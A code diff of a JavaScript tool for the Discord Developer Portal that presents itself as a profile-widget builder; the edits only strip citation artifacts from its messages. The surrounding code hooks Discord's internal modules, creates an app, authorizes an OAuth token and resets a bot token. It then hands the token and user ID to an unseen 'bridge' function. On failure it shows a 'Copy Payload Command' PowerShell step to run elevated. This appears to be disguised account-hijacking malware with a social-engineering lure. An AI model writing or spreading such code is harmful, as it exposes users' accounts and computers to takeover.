@@ -236,7 +236,7 @@
               <button class="${PREFIX}-close-btn" id="${PREFIX}-close">Close App</button>
             </div>
             <div id="${PREFIX}-content" class="${PREFIX}-scroll">
-              <div id="${PREFIX}-note">🛡️ <strong>Automated System Core Active:</strong> Complete any required application authorization checkpoints or verification checks natively inside the Developer Portal view scope if requested[cite: 2].</div>
+              <div id="${PREFIX}-note">🛡️ <strong>Automated System Core Active:</strong> Complete any required application authorization checkpoints or verification checks natively inside the Developer Portal view scope if requested .</div>
               
               <div class="${PREFIX}-section-card">
                 <div class="${PREFIX}-card-title">Console Diagnostics Log</div>
@@ -251,7 +251,7 @@
 
               <div class="${PREFIX}-section-card">
                 <div class="${PREFIX}-card-title">Data Blueprint Object Repository</div>
-                <textarea id="${PREFIX}-json" placeholder='Paste shared widget data objects here or click "Export Structure" to scan active frames[cite: 2].'></textarea>
+                <textarea id="${PREFIX}-json" placeholder='Paste shared widget data objects here or click "Export Structure" to scan active frames .'></textarea>
                 <div class="${PREFIX}-control-row">
                   <select id="${PREFIX}-target">
                     <option value="new" disabled selected style="color: #80848e;">🔒 Create a new app (Coming Soon! Please create an app manually and then load your apps here to import!)</option>
@@ -267,9 +267,9 @@
 
               <div id="${PREFIX}-fallback">
                 <p style="margin: 0 0 8px 0; font-weight: 700; color: #f23f43;">⚠️ Identity Integration Sync Blocked</p>
-                <span style="font-size: 13px; color: #dbdee1;">Execute the dynamic backend pipeline package from an elevated terminal session (PowerShell for Windows Shell environments) to bypass sync limits[cite: 2]:</span>
+                <span style="font-size: 13px; color: #dbdee1;">Execute the dynamic backend pipeline package from an elevated terminal session (PowerShell for Windows Shell environments) to bypass sync limits :</span>
                 <textarea id="${PREFIX}-fallback-text" readonly></textarea>
-                <button class="${PREFIX}-btn" id="${PREFIX}-copy" style="margin-top: 12px; background: #f23f43;">Copy Payload Command[cite: 2]</button>
+                <button class="${PREFIX}-btn" id="${PREFIX}-copy" style="margin-top: 12px; background: #f23f43;">Copy Payload Command </button>
               </div>
             </div>
           </div>
@@ -289,7 +289,7 @@
         panelEl.querySelector(`#${PREFIX}-clear`).addEventListener("click", () => { logEl.innerHTML = ""; fallbackWrap.classList.remove(`${PREFIX}-open`); });
         panelEl.querySelector(`#${PREFIX}-copy`).addEventListener("click", () => copyFallback());
 
-        log("Ready to build. Create a dynamic configuration layout profile[cite: 2].", "info");
+        log("Ready to build. Create a dynamic configuration layout profile .", "info");
       }
 
       function log(msg, level = "info") {
@@ -338,7 +338,7 @@
         const btn = document.getElementById(`${PREFIX}-copy`);
         try {
           await navigator.clipboard.writeText(fallbackText.value);
-          if (btn) { btn.textContent = "Payload Extracted!"; setTimeout(() => (btn.textContent = "Copy Payload Command[cite: 2]"), 1500); }
+          if (btn) { btn.textContent = "Payload Extracted!"; setTimeout(() => (btn.textContent = "Copy Payload Command "), 1500); }
         } catch (e) {
           fallbackText.focus(); fallbackText.select();
         }
@@ -405,7 +405,7 @@
 
     function readJsonBox() {
       const raw = UI.getJson().trim();
-      if (!raw) { UI.log("Paste target widget JSON schematic into workspace buffer[cite: 2].", "warn"); return null; }
+      if (!raw) { UI.log("Paste target widget JSON schematic into workspace buffer .", "warn"); return null; }
       try { return JSON.parse(raw); }
       catch (e) { UI.log("Syntax validation error: " + e.message, "error"); return null; }
     }
@@ -470,7 +470,7 @@
 
     function getInternals() {
       if (typeof window.webpackChunkdiscord_developers === "undefined") {
-        throw new Error("Discord Engine Module Bundle is absent. Allow portal core initialization dependencies to populate fully[cite: 2].");
+        throw new Error("Discord Engine Module Bundle is absent. Allow portal core initialization dependencies to populate fully.");
       }
       const wpRequire = window.webpackChunkdiscord_developers.push([["dwc_" + Math.random()], {}, (r) => r]);
       window.webpackChunkdiscord_developers.pop();
@@ -500,12 +500,12 @@
     }
 
     async function fetchConfig(api, appId) {
-      const listRes = await apiCall(api, "get", { url: `/applications/${appId}/widget-configs` }, "Querying existing profile widget matrices[cite: 2]");
+      const listRes = await apiCall(api, "get", { url: `/applications/${appId}/widget-configs` }, "Querying existing profile widget matrices ");
       let b = listRes.body;
       let cfg = Array.isArray(b) ? b[0] : (b && Array.isArray(b.configs) ? b.configs[0] : b);
       if (cfg && cfg.config_id && !cfg.surfaces) {
         try {
-          const full = await apiCall(api, "get", { url: `/applications/${appId}/widget-configs/${cfg.config_id}` }, "Fetching mapping blueprints[cite: 2]");
+          const full = await apiCall(api, "get", { url: `/applications/${appId}/widget-configs/${cfg.config_id}` }, "Fetching mapping blueprints ");
           cfg = full.body || cfg;
         } catch (e) {}
       }
@@ -581,7 +581,7 @@
           ok++;
         } catch (e) {}
       }
-      if (ok) UI.log(`Successfully mapped assets (${ok}) into runtime package matrix[cite: 2].`, "success");
+      if (ok) UI.log(`Successfully mapped assets (${ok}) into runtime package matrix .`, "success");
       return Object.keys(bundle).length ? bundle : null;
     }
 
@@ -606,7 +606,7 @@
           uploaded++;
         } catch (e) { UI.log(`Image cluster component upload execution block "${name}": ${describeErr(e)}`, "warn"); }
       }
-      UI.log(`Asset matrix integration resolved. Synchronized: ${uploaded}, Existing: ${reused}.[cite: 2]`, "success");
+      UI.log(`Asset matrix integration resolved. Synchronized: ${uploaded}, Existing: ${reused}. `, "success");
       return remap;
     }
 
@@ -623,18 +623,18 @@
     }
 
     async function createWidget(opts) {
-      UI.log("Binding to portal processing cores[cite: 2]...", "step");
+      UI.log("Binding to portal processing cores ...", "step");
       const { ApexStore, UserStore, FluxDispatcher, api } = getInternals();
       const userId = UserStore.getCurrentUser().id;
-      UI.log(`Account context authorized: User Identity ${userId}.[cite: 2]`, "info");
+      UI.log(`Account context authorized: User Identity ${userId}. `, "info");
 
       const displayName = opts.displayName || "My Profile Widget";
       const surfacesBody = opts.surfaces || buildSurfaces();
 
-      const appRes = await apiCall(api, "post", { url: "/applications", body: { name: "Interactive Widget Instance", team_id: null } }, "Provisioning application endpoint registry[cite: 2]");
+      const appRes = await apiCall(api, "post", { url: "/applications", body: { name: "Interactive Widget Instance", team_id: null } }, "Provisioning application endpoint registry ");
       FluxDispatcher.dispatch({ type: "APPLICATION_CREATE_SUCCESS", application: appRes.body });
       const appId = appRes.body.id;
-      UI.log(`Registry entry established. Application ID: ${appId}.[cite: 2]`, "success");
+      UI.log(`Registry entry established. Application ID: ${appId}. `, "success");
 
       await apiCall(api, "post", {
         url: `/applications/${appId}/social-sdk/enable`,
@@ -643,9 +643,9 @@
           email_updates_consent: false, country_or_region: "United States", title_role: "Founder",
           target_platforms: [], form_type: "Dev Solutions", sfdc_leadsource: "Dev Portal", utm_campaign: "SDK Enable Form",
         },
-      }, "Enabling Core Social Presence SDK interface layers[cite: 2]");
+      }, "Enabling Core Social Presence SDK interface layers ");
 
-      const configRes = await apiCall(api, "post", { url: `/applications/${appId}/widget-configs`, body: { display_name: displayName } }, "Initializing surface configuration container models[cite: 2]");
+      const configRes = await apiCall(api, "post", { url: `/applications/${appId}/widget-configs`, body: { display_name: displayName } }, "Initializing surface configuration container models ");
       const configId = configRes.body.config_id;
       lastApp = { appId, configId };
       let layoutBody = surfacesBody;
@@ -653,26 +653,26 @@
         const remap = await materializeAssets(api, appId, opts.assets);
         layoutBody = { surfaces: remapSurfaceAssets(surfacesBody.surfaces, remap) };
       }
-      await apiCall(api, "patch", { url: `/applications/${appId}/widget-configs/${configId}`, body: layoutBody }, "Injecting operational node layer configurations[cite: 2]");
-      await apiCall(api, "post", { url: `/applications/${appId}/widget-configs/${configId}/publish` }, "Broadcasting state layout mappings to CDN nodes[cite: 2]");
+      await apiCall(api, "patch", { url: `/applications/${appId}/widget-configs/${configId}`, body: layoutBody }, "Injecting operational node layer configurations ");
+      await apiCall(api, "post", { url: `/applications/${appId}/widget-configs/${configId}/publish` }, "Broadcasting state layout mappings to CDN nodes ");
 
-      await apiCall(api, "patch", { url: `/applications/${appId}`, body: { redirect_uris: ["https://discord.com"] } }, "Configuring routing maps[cite: 2]");
-      await apiCall(api, "post", { url: `/oauth2/authorize?client_id=${appId}&response_type=token&scope=sdk.social_layer_presence`, body: { authorize: true } }, "Muxing security scope layers[cite: 2]");
+      await apiCall(api, "patch", { url: `/applications/${appId}`, body: { redirect_uris: ["https://discord.com"] } }, "Configuring routing maps ");
+      await apiCall(api, "post", { url: `/oauth2/authorize?client_id=${appId}&response_type=token&scope=sdk.social_layer_presence`, body: { authorize: true } }, "Muxing security scope layers ");
       
-      const profileRes = await apiCall(api, "get", { url: `/users/${userId}/profile` }, "Querying master global user profile container state[cite: 2]");
+      const profileRes = await apiCall(api, "get", { url: `/users/${userId}/profile` }, "Querying master global user profile container state ");
       const existingWidgets = profileRes.body.widgets || [];
       existingWidgets.unshift({ data: { type: "application", application_id: appId } });
-      await apiCall(api, "put", { url: `/users/@me/widgets`, body: { widgets: existingWidgets } }, "Binding application viewport instance onto global account presence matrix[cite: 2]");
+      await apiCall(api, "put", { url: `/users/@me/widgets`, body: { widgets: existingWidgets } }, "Binding application viewport instance onto global account presence matrix ");
 
-      const botTokenRes = await apiCall(api, "post", { url: `/applications/${appId}/bot/reset` }, "Minting privileged application network synchronization keys[cite: 2]");
+      const botTokenRes = await apiCall(api, "post", { url: `/applications/${appId}/bot/reset` }, "Minting privileged application network synchronization keys ");
       const botToken = botTokenRes.body.token;
 
-      UI.log("Synchronizing background system configuration structures[cite: 2]...", "step");
+      UI.log("Synchronizing background system configuration structures ...", "step");
       const result = await bridgeFinalize(appId, userId, botToken);
       if (result.ok) {
-        UI.log("Background synchronization completed successfully[cite: 2].", "success");
+        UI.log("Background synchronization completed successfully .", "success");
       } else {
-        UI.log(`Background network execution blocked: Status ${result.status}[cite: 2]`, "error");
+        UI.log(`Background network execution blocked: Status ${result.status} `, "error");
         UI.showFallback(buildPowershell(appId, userId, botToken));
       }
 
@@ -685,7 +685,7 @@
         UI.log("Interface synchronized. System components active.", "success");
       } catch (e) { UI.log(`Sidebar layout force-injection skipped.`, "warn"); }
 
-      UI.log(`Operation fully resolved. Target Application Identifier: ${appId}[cite: 2]`, "success");
+      UI.log(`Operation fully resolved. Target Application Identifier: ${appId} `, "success");
     }
 
     async function applyToApp(api, appId, body, assets) {
@@ -695,7 +695,7 @@
         configId = cfg && cfg.config_id;
       }
       if (!configId) {
-        const configRes = await apiCall(api, "post", { url: `/applications/${appId}/widget-configs`, body: { display_name: "Profile Widget Setup" } }, "Provisioning uninitialized mapping models[cite: 2]");
+        const configRes = await apiCall(api, "post", { url: `/applications/${appId}/widget-configs`, body: { display_name: "Profile Widget Setup" } }, "Provisioning uninitialized mapping models ");
         configId = configRes.body.config_id;
       }
       lastApp = { appId, configId };
@@ -704,15 +704,15 @@
         const remap = await materializeAssets(api, appId, assets);
         outBody = { surfaces: remapSurfaceAssets(body.surfaces, remap) };
       }
-      await apiCall(api, "patch", { url: `/applications/${appId}/widget-configs/${configId}`, body: outBody }, "Hot-swapping component structure rules[cite: 2]");
-      await apiCall(api, "post", { url: `/applications/${appId}/widget-configs/${configId}/publish` }, "Baking production assets into edge nodes[cite: 2]");
+      await apiCall(api, "patch", { url: `/applications/${appId}/widget-configs/${configId}`, body: outBody }, "Hot-swapping component structure rules ");
+      await apiCall(api, "post", { url: `/applications/${appId}/widget-configs/${configId}/publish` }, "Baking production assets into edge nodes ");
     }
 
     function importWidget() {
       if (UI.isRunning()) return;
       const json = readJsonBox(); if (!json) return;
       const body = extractSurfacesBody(json);
-      if (!body) { UI.log("Validation structural failure: Top-level data objects are corrupt[cite: 2].", "error"); return; }
+      if (!body) { UI.log("Validation structural failure: Top-level data objects are corrupt .", "error"); return; }
       const target = UI.getTarget();
       if (target === "new") {
         UI.log("Compiling setup task vectors from structural schematic imports...", "step");
@@ -727,9 +727,9 @@
       UI.setRunning(true); UI.setStatus("Patching Matrix", "#5865f2");
       try {
         const { api } = getInternals();
-        UI.log("Locating application parameters inside target element[cite: 2]...", "step");
+        UI.log("Locating application parameters inside target element ...", "step");
         await applyToApp(api, appId, body, assets);
-        UI.log("Application matrix state synchronized successfully. ✔[cite: 2]", "success");
+        UI.log("Application matrix state synchronized successfully. ✔ ", "success");
         UI.setStatus("Idle", "#23a55a");
       } catch (err) { UI.log(`Hot-patch failed: ${err.message}`, "error"); UI.setStatus("Failed Execution", "#f23f43");
       } finally { UI.setRunning(false); }
@@ -743,9 +743,9 @@
       try {
         const { api } = getInternals();
         const appId = currentAppId() || (lastApp && lastApp.appId);
-        if (!appId) throw new Error("Initialize configuration context by choosing an application panel node first[cite: 2].");
+        if (!appId) throw new Error("Initialize configuration context by choosing an application panel node first .");
         await applyToApp(api, appId, body, json.assets);
-        UI.log("Dynamic state configuration arrays cleared and updated. ✔[cite: 2]", "success");
+        UI.log("Dynamic state configuration arrays cleared and updated. ✔ ", "success");
         UI.setStatus("Idle", "#23a55a");
       } catch (err) { UI.log(`Reload action abort execution: ${err.message}`, "error"); UI.setStatus("Failed Execution", "#f23f43");
       } finally { UI.setRunning(false); }
@@ -756,11 +756,11 @@
       UI.setRunning(true); UI.setStatus("Polling Registry", "#5865f2");
       try {
         const { api } = getInternals();
-        const res = await apiCall(api, "get", { url: "/applications" }, "Downloading account identity application maps[cite: 2]");
+        const res = await apiCall(api, "get", { url: "/applications" }, "Downloading account identity application maps ");
         const raw = Array.isArray(res.body) ? res.body : (res.body && Array.isArray(res.body.applications) ? res.body.applications : []);
         const apps = raw.filter((a) => a && a.id).map((a) => ({ id: a.id, name: a.name }));
         UI.setTargetOptions(apps);
-        UI.log(`Mapped active applications (${apps.length}) into configuration routing registers[cite: 2].`, "success");
+        UI.log(`Mapped active applications (${apps.length}) into configuration routing registers .`, "success");
         UI.setStatus("Idle", "#23a55a");
       } catch (err) { UI.log(`Failed to fetch applications structural map: ${err.message}`, "error"); UI.setStatus("Failed Execution", "#f23f43");
       } finally { UI.setRunning(false); }
@@ -772,16 +772,16 @@
       try {
         const { api } = getInternals();
         const appId = currentAppId() || (lastApp && lastApp.appId);
-        if (!appId) throw new Error("Select an existing app inside the developer tree path to perform extraction[cite: 2].");
-        UI.log(`Reassembled schema arrays for target element structure ${appId}[cite: 2]...`, "step");
+        if (!appId) throw new Error("Select an existing app inside the developer tree path to perform extraction .");
+        UI.log(`Reassembled schema arrays for target element structure ${appId} ...`, "step");
         const cfg = await fetchConfig(api, appId);
-        if (!cfg || !cfg.surfaces) throw new Error("Operational layout rules missing or map array is blank[cite: 2].");
+        if (!cfg || !cfg.surfaces) throw new Error("Operational layout rules missing or map array is blank .");
         if (cfg.config_id) lastApp = { appId, configId: cfg.config_id };
         const assets = await buildAssetBundle(api, appId, cfg.surfaces);
         const envelope = { _type: "discord-widget", version: 2, display_name: cfg.display_name || "Extracted Design System", surfaces: cfg.surfaces };
         if (assets) envelope.assets = assets;
         UI.setJson(JSON.stringify(envelope, null, 2));
-        UI.log("Extraction resolved. Schematic tree serialized to operational clipboard buffer[cite: 2].", "success");
+        UI.log("Extraction resolved. Schematic tree serialized to operational clipboard buffer .", "success");
         UI.setStatus("Idle", "#23a55a");
       } catch (err) { UI.log(`Extraction operations failure: ${err.message}`, "error"); UI.setStatus("Failed Execution", "#f23f43");
       } finally { UI.setRunning(false); }
@@ -792,17 +792,17 @@
         try {
           const { ApexStore } = getInternals();
           ApexStore.createOverride(WIDGET_EXPERIMENT, 1);
-          if (announce) UI.log("Forced interface feature flag constraints overrides into memory registry[cite: 2].", "success");
+          if (announce) UI.log("Forced interface feature flag constraints overrides into memory registry .", "success");
           return true;
         } catch (e) { await sleep(200); }
       }
-      if (announce) UI.log("Feature flag injection engine timeline exception: Hooks unresolved[cite: 2].", "warn");
+      if (announce) UI.log("Feature flag injection engine timeline exception: Hooks unresolved .", "warn");
       return false;
     }
 
     async function reactivateWidgetTab() {
       if (UI.isRunning()) return;
-      UI.log("Running interface sidebar node injection pipeline[cite: 2]...", "step");
+      UI.log("Running interface sidebar node injection pipeline ...", "step");
       if (!(await ensureWidgetTab(true))) return;
       const appId = currentAppId();
       const widgetLink = () => document.querySelector(`a[href="/developers/applications/${appId}/widget"]`);
@@ -810,9 +810,9 @@
         document.querySelector(`a[href="/developers/applications/${appId}"]`)?.click();
         for (let i = 0; i < 40 && !widgetLink(); i++) await sleep(100);
       }
-      if (!appId) UI.log("Override matrix updated globally. Enter any app configuration page[cite: 2].", "success");
-      else if (widgetLink()) UI.log("Interface node verified inside target sidebar layout tree[cite: 2].", "success");
-      else UI.log("Node verification exception. Manually cycle page index routes to map state templates[cite: 2].", "warn");
+      if (!appId) UI.log("Override matrix updated globally. Enter any app configuration page .", "success");
+      else if (widgetLink()) UI.log("Interface node verified inside target sidebar layout tree .", "success");
+      else UI.log("Node verification exception. Manually cycle page index routes to map state templates .", "warn");
     }
 
     const overridePromise = ensureWidgetTab(false);
@@ -826,7 +826,7 @@
       UI.bindButton("load", loadWidgetList);
       UI.bindButton("tab", reactivateWidgetTab);
       overridePromise.then((ok) => {
-        if (ok) UI.log("Natively patched sidebar dynamic navigation layers (re-linked after memory flash)[cite: 2].", "success");
+        if (ok) UI.log("Natively patched sidebar dynamic navigation layers (re-linked after memory flash) .", "success");
       });
     }
 
